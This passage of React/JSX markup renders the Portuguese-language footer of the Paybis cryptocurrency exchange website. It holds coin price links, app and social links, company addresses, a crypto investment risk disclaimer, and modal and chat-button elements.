                          className="footer-links__item"
                          href="/pt/price/stellar/"
                          title="Stellar Preço"
                          data-testid="stellarprice"
                        >
                          Stellar Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/binance-coin/"
                          title="Binance Coin Preço"
                          data-testid="binanceprice"
                        >
                          Binance Coin Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/dogecoin/"
                          title="Dogecoin Preço"
                          data-testid="dogeprice"
                        >
                          Dogecoin Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/tron/"
                          title="TRON Preço"
                          data-testid="tronprice"
                        >
                          TRON Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/tether/"
                          title="Tether Preço"
                          data-testid="tetherprice"
                        >
                          Tether Preço
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <div className="footer__links-wrapper">
              <div className="footer__status-page-link">
                <a
                  className="btn btn-secondary btn-lg"
                  href="https://status.paybis.com"
                  target="_blank"
                >
                  <img
                    src="images/heart-half-stroke.svg"
                    loading="lazy"
                    alt="Paybis status page"
                  />
                  Página de status
                </a>
              </div>
              <div className="footer__mob-app-links">
                <h3 className="footer__mob-app-links-title">
                  Baixe o nosso aplicativo:
                </h3>
                <div className="mob-app-links-container">
                  <a
                    href="https://go.payb.is/mobile-app?language=pt"
                    target="_blank"
                    className="footer__mob-app-link"
                  >
                    <img
                      src="images/app-google.svg"
                      alt="Baixe o aplicativo no Google Play"
                      className="mobile-app__apps-img"
                      loading="lazy"
                    />
                  </a>
                  <a
                    href="https://go.payb.is/mobile-app?language=pt"
                    target="_blank"
                  >
                    <img
                      src="images/app-apple.svg"
                      alt="Baixe o aplicativo na App Store"
                      className="mobile-app__apps-img"
                      loading="lazy"
                    />
                  </a>
                </div>
              </div>
            </div>
            <div className="footer__row">
              <div className="footer-info">
                <h4 className="footer-info__title">Contatos</h4>
                <ul className="footer-info__contacts">
                  <li className="footer-info__contacts-item footer-info__contacts-item--lg">
                    <a href="mailto:support@paybis.com">support@paybis.com</a>
                  </li>
                </ul>
              </div>
              <div className="footer-social">
                <a
                  className="footer-social__item footer-social__item--linkedin"
                  href="https://www.linkedin.com/company/paybis/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-linkedin"></i>
                  <span className="footer-social__item-value">1.4k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--twitter"
                  href="https://twitter.com/paybis"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-twitter"></i>
                  <span className="footer-social__item-value">10.1k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--youtube"
                  href="https://www.youtube.com/@Paybis"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-youtube"></i>
                  <span className="footer-social__item-value">26.6k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--instagram"
                  href="https://www.instagram.com/paybis/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-instagram"></i>
                  <span className="footer-social__item-value">3.9k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--facebook"
                  href="https://www.facebook.com/Paybis/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-facebook-f"></i>
                  <span className="footer-social__item-value">3.6k</span>
                </a>
              </div>
            </div>
            <div className="footer__row">
              <div className="footer__copy">
                PAYBIS POLAND Sp. z o.o. (0001041711), Hoża 86/210, Warsaw,
                Poland, 00-682
                <br />
                PAYBIS USA LTD (87-1891757), 321 S. Boston, Tulsa, OK, 74103
                <br />
                © 2014-2024 Paybis.com, Todos os direitos reservados.
                <br />
                <br />
                Investir em criptoativos envolve um risco significativo. Você
                não deve investir mais do que pode se dar ao luxo de perder e
                deve garantir que compreende totalmente os riscos envolvidos.
                Não somos regulados pela Autoridade de Conduta Financeira e os
                investimentos em criptoativos não são cobertos pelo Serviço de
                Ombudsman Financeiro nem sujeitos à proteção sob o Esquema de
                Compensação de Serviços Financeiros.
                <a
                  href="//www.dmca.com/Protection/Status.aspx?ID=2f92f7f5-f81e-4541-b908-fe7d31c9332b"
                  title="DMCA.com Protection Status"
                  className="dmca-badge footer__dmca-badge"
                >
                  <img
                    src="images/dmca_protected_sml_120d.png"
                    width="120"
                    height="21"
                    alt="DMCA.com Protection Status"
                    loading="lazy"
                  />
                </a>
              </div>
            </div>
          </div>
        </div>
      </footer>
      <div id="generalPopUpModal">
        <div className="modal modal--sm">
          <div className="modal__dialog">
            <div className="modal__content">
              <button className="modal__close">Fechar</button>
              <div className="modal-body"></div>
            </div>
          </div>
        </div>
        <div className="modal__backdrop"></div>
      </div>
      <div id="warningPopUpModal">
        <div className="modal modal--lg">
          <div className="modal__dialog">
            <div className="modal__content">
              <button className="modal__close">Fechar</button>
              <div className="modal-content modal-content--lg modal-body"></div>
              <div className="modal-content modal-content--lg modal-footer">
                <button
                  type="button"
                  className="btn btn-primary"
                  id="warningPopupModalContinueBtn"
                >
                  Continuar
                </button>
                <button
                  type="button"
                  className="btn btn-secondary"
                  data-dismiss="modal"
                >
                  Voltar
                </button>
              </div>
            </div>
          </div>
        </div>
        <div className="modal__backdrop"></div>
      </div>

      <button id="cex-back-to-top" className="topbtn" title="Voltar ao início">
        Voltar ao início
      </button>
      <div id="chatButton"></div>
      <div id="chatButtonFacade" className="intercom">
        <div id="chat-image" className="intercom-livechat-logo"></div>
        <svg id="spinner" className="spinner" viewBox="0 0 50 50">
          <circle
            className="path"
            cx="25"
            cy="25"
            r="20"
            fill="none"
            stroke-width="5"
          ></circle>
        </svg>
      </div>
    </div>
  );
}
